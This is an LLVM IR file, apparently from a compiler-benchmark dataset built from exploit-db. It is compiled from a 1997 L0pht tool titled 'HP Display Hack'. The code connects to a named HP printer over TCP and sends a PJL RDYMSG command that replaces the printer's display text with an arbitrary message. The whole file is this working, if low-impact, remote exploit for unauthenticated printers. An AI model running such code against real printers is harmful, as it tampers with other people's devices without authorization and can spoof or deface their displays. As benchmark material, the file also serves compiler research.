; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_20565.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_20565.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr_in = type { i32, i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [64 x i8] c"HP Display Hack\0A--sili@l0pht.com 12/8/97\0A\0A%s printer \22message\22\0A\00", align 1
@.str.1 = private unnamed_addr constant [42 x i8] c"\09Message can be up to 16 characters long\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"HP Display hack -- sili@l0pht.com\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"Hostname:   %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"Message: %s\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"Connecting....\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.9 = private unnamed_addr constant [33 x i8] c"\1B%-12345X@PJL RDYMSG DISPLAY = \22\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"\22\0D\0A\1B%-12345X\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"Sent %d bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca [100 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = load i32, i32* %3, align 4
  %12 = icmp ne i32 %11, 3
  br i1 %12, label %13, label %20

13:                                               ; preds = %2
  %14 = load i8**, i8*** %4, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0), i8* %16)
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %2
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call %struct.hostent* @gethostbyname(i8* %23)
  store %struct.hostent* %24, %struct.hostent** %8, align 8
  %25 = icmp eq %struct.hostent* %24, null
  br i1 %25, label %26, label %29

26:                                               ; preds = %20
  %27 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #3
  unreachable

29:                                               ; preds = %20
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* %33)
  %35 = load i8**, i8*** %4, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* %37)
  %39 = load %struct.hostent*, %struct.hostent** %8, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 2
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  store i32 %41, i32* %42, align 4
  %43 = load i32, i32* @PORT, align 4
  %44 = call i32 @htons(i32 %43)
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %44, i32* %45, align 4
  %46 = load %struct.hostent*, %struct.hostent** %8, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 1
  %48 = load i32, i32* %47, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %50 = bitcast i32* %49 to i8*
  %51 = load %struct.hostent*, %struct.hostent** %8, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @bcopy(i32 %48, i8* %50, i32 %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %56 = call i32 @bzero(i32* %55, i32 8)
  %57 = load i32, i32* @AF_INET, align 4
  %58 = load i32, i32* @SOCK_STREAM, align 4
  %59 = call i32 @socket(i32 %57, i32 %58, i32 0)
  store i32 %59, i32* %5, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %64

61:                                               ; preds = %29
  %62 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %63 = call i32 @exit(i32 1) #3
  unreachable

64:                                               ; preds = %29
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  %66 = load i32, i32* %5, align 4
  %67 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %68 = call i32 @connect(i32 %66, %struct.sockaddr* %67, i32 16)
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %73

70:                                               ; preds = %64
  %71 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %72 = call i32 @exit(i32 1) #3
  unreachable

73:                                               ; preds = %64
  %74 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %75 = call i32 @strcpy(i8* %74, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.9, i64 0, i64 0))
  %76 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 2
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @strncat(i8* %76, i8* %79, i32 16)
  %81 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %82 = call i32 @strcat(i8* %81, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0))
  %83 = load i32, i32* %5, align 4
  %84 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %85 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %86 = call i32 @strlen(i8* %85)
  %87 = call i32 @send(i32 %83, i8* %84, i32 %86, i32 0)
  store i32 %87, i32* %7, align 4
  %88 = load i32, i32* %7, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* %5, align 4
  %91 = call i32 @close(i32 %90)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bcopy(i32, i8*, i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
